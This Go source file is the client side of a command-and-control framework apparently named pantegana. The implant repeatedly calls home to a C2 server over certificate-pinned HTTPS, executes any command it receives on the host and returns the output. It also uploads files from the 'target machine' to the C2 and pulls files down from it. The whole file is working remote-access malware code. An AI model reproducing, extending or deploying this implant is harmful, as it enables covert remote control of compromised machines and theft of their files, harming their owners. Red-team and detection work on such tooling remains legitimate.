package client

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

//go:generate go-bindata -o cert.go ../cert/server.crt

// routes
const getCmdURL = "/getcmd"
const cmdOutputURL = "/cmdoutput"
const uploadFileURL = "/upload"
const downloadFileURL = "/download"

// special errors
var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")

// debug
var hasTLS = true

const hasLogs = true

// client-token
var token string

func ClientSetup() *http.Client {
	// set up own cert pool
	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
	transport := &http.Transport{TLSClientConfig: tlsConfig}
	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Minute,
	}

	// load trusted cert path
	caCert, err := Asset("../cert/server.crt")
	if err != nil {
		panic(err)
	}
	ok := tlsConfig.RootCAs.AppendCertsFromPEM(caCert)
	if !ok {
		panic("Couldn't load cert file")
	}

	return client
}

// RequestCommand sends a HTTPS GET request to the master pantegana server
// /getCmd endpoint and returns the parsed command string.
func RequestCommand(client *http.Client, host string, port int) (string, string) {
	log.Println("[+] Calling home to c2 to get cmd...")

	var httpstr string
	if hasTLS {
		httpstr = "https"
	} else {
		httpstr = "http"
	}

	hoststr := fmt.Sprintf("%s://%s:%d", httpstr, host, port)

	req, err := http.NewRequest("GET", hoststr+getCmdURL, nil)
	if err != nil {
		log.Printf("[-] Error creating the GET request: %s\n", err)
	}

	req.Header.Add("Token", token)

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[-] Got error when requesting cmd: %s\nRetrying in 5 seconds...\n", err)
		if err == ErrHTTPResponse {
			hasTLS = false
		}
		time.Sleep(5 * time.Second)
		return RequestCommand(client, host, port)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("[-] Error while reading body of request: %s", err)
	}
	log.Printf("[+] Got cmd from backend:\n%s\n", body)
	if string(body) == "Client sent an HTTP request to an HTTPS server.\n" {
		hasTLS = true
		defer log.Printf("[+] Retrying with HTTPS...\n")
	}

	defer resp.Body.Close()
	return strings.Trim(string(body), " \n\r"), hoststr
}

// Middleware splits of the flow corresponding to the cmd
// string and delegates to the method that is repsonsible for
// taking out the action.
func Middleware(client *http.Client, cmd string, host string) {
	if strings.Compare(cmd, "quit") == 0 {
		log.Println("[+] Quitting due to quit cmd from c2")
		os.Exit(0)
	} else if strings.HasPrefix(cmd, "upload") {
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			log.Println("[-] Invalid upload command syntax.")
		} else {
			localFilePath := cmdTokens[1]
			remoteFilePath := cmdTokens[2]
			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
		}
	} else if strings.HasPrefix(cmd, "download") {
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			log.Println("[-] Invalid download command syntax.")
		} else {
			remoteFilePath := cmdTokens[1]
			localFilePath := cmdTokens[2]
			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
		}
	} else {
		out := ExecAndGetOutput(string(cmd))
		log.Printf("[+] Sending back output:\n%s\n", string(out))
		req, err := http.NewRequest("POST", host+cmdOutputURL, bytes.NewBuffer(out))
		if err != nil {
			log.Printf("[-] Error creating the GET request: %s\n", err)
			return
		}

		req.Header.Add("Token", token)
		req.Header.Set("Content-Type", "text/html")

		client.Do(req)
	}
	client.CloseIdleConnections()
}

// UploadFile uploads a local file on the target machine to the c2.
func UploadFile(client *http.Client, url string, localFilePath string, remoteFilePath string) {
	// open the file of interest
	file, err := os.Open(localFilePath)
	if err != nil {
		log.Printf("[-] Error opening file: %s\n", err)
		return
	}
	defer file.Close()

	// create the form file
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("uploadFile", filepath.Base(remoteFilePath))
	if err != nil {
		log.Printf("[-] Error creating form file: %s\n", err)
		return
	}
	_, err = io.Copy(part, file)
	err = writer.Close()
	if err != nil {
		log.Printf("[-] Error closing the multipart writer: %s\n", err)
		return
	}

	// create the request
	req, err := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	if err != nil {
		log.Printf("[-] Error creating the request: %s\n", err)
		return
	}

	// send it off
	_, err = client.Do(req)
	if err != nil {
		log.Printf("[-] Error sending upload request: %s\n", err)
		return
	}
	log.Println("[+] Uploaded file.")
}

// DownloadFile downloads a file from the c2 to the local target machine.
func DownloadFile(client *http.Client, url string, filePath string) {
	// get the file data
	log.Println(url)
	resp, err := client.Get(url)
	if err != nil {
		log.Printf("[-] Error getting file to download from c2: %s\n", err)
		return
	}
	defer resp.Body.Close()

	// create downloads dir if not existant yet
	_ = os.Mkdir("downloads", 0755)
	// create local file
	out, err := os.Create("downloads/" + filePath)
	if err != nil {
		log.Printf("[-] Error creating local file: %s\n", err)
		return
	}
	defer out.Close()

	// and write data to it
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		log.Printf("[-] Error writing to local file: %s\n", err)
		return
	}
	log.Println("[+] Successfully downloaded file")
}

// ExecAndGetOutput executes the command string on the OS
// and returns the combined output.
func ExecAndGetOutput(cmdString string) []byte {
	log.Println("[+] Executing cmd...")
	cmdTokens := strings.Split(cmdString, " ")
	log.Println(cmdTokens)
	cmd := exec.Command(cmdTokens[0], cmdTokens[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("[-] Failed to execute cmd with error: %s\n", err)
		out = []byte("Failed to execute cmd")
	}
	return out
}

func RunClient(host string, port int) {
	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
	token = strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)

	if !hasLogs {
		log.SetFlags(0)
		log.SetOutput(ioutil.Discard)
	}

	client := ClientSetup()

	RunFingerprinter()

	for {
		cmd, hoststr := RequestCommand(client, host, port)
		Middleware(client, cmd, hoststr)
	}
}
